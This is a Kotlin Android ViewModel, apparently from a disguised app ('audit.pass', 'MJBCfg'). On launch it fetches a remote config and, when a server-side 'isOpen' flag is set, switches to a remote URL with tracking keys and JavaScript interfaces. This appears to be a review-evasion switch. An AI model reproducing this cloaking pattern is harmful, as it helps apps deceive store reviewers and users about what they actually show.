package com.audit.pass.app.ui

import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.lifecycle.ViewModel
import com.audit.pass.app.utils.Const
import com.audit.pass.app.utils.HttpCallbackListener
import com.audit.pass.app.utils.HttpUtil
import com.audit.pass.app.utils.MJBCfg
import com.audit.pass.app.utils.SpUtil
import com.google.gson.Gson
import java.nio.charset.StandardCharsets

class MainViewModel : ViewModel() {
    // 使用StateFlow来保存网络请求结果的状态
    var viewStates by mutableStateOf(MainViewState())
        private set

    init {
        checkOpen(Const.LINK_URL + Const.APP_KEY_ID + ".json")
    }

    fun checkOpen(connectURL: String?) {
        HttpUtil.sendGetRequest(
            connectURL,
            object : HttpCallbackListener {
                override fun onFinish(response: ByteArray?) {
                    val json = String(response!!, StandardCharsets.UTF_8)
                    Log.i(Const.APP_KEY_ID, json)
                    val mjbData = Gson().fromJson(json, MJBCfg::class.java)

                    if (mjbData == null) {
                        Log.i(Const.APP_KEY_ID, "no data 。。")
                        viewStates = viewStates.copy(isSplash = false, isOpen = false)
                        return
                    }

                    if (!mjbData.isOpen) {
                        Log.i(Const.APP_KEY_ID, "not open 。。")
                        viewStates = viewStates.copy(isSplash = false, isOpen = false)
                        return
                    }

                    SpUtil.put(Const.URL, mjbData.url)
                    SpUtil.put(Const.AFKey, mjbData.afKey)
                    SpUtil.put(Const.ADJUST_TOKEN, mjbData.ajToken)
                    SpUtil.put(Const.Orientation, mjbData.orientation)
                    SpUtil.put(Const.JSInterfaceName, Gson().toJson(mjbData.jsInterface))

                    viewStates = viewStates.copy(
                        isSplash = false,
                        isOpen = true,
                        url = mjbData.url,
                        afKey = mjbData.afKey,
                        orientation = mjbData.orientation,
                        ajToken = mjbData.ajToken,
                        jsInterface = mjbData.jsInterface
                    )
                    return
                }

                override fun onError(e: Exception?) {
                    Log.e(Const.TAG, e!!.message!!)
                    viewStates = viewStates.copy(isSplash = false, isOpen = false)
                }
            })
    }

}

data class MainViewState(
    val isSplash: Boolean = true,
    val isOpen: Boolean = false,
    val url: String = "",
    val afKey: String = "",
    val ajToken: String = "",
    val jsInterface: ArrayList<String> = arrayListOf(),
    val orientation: String = "",
)

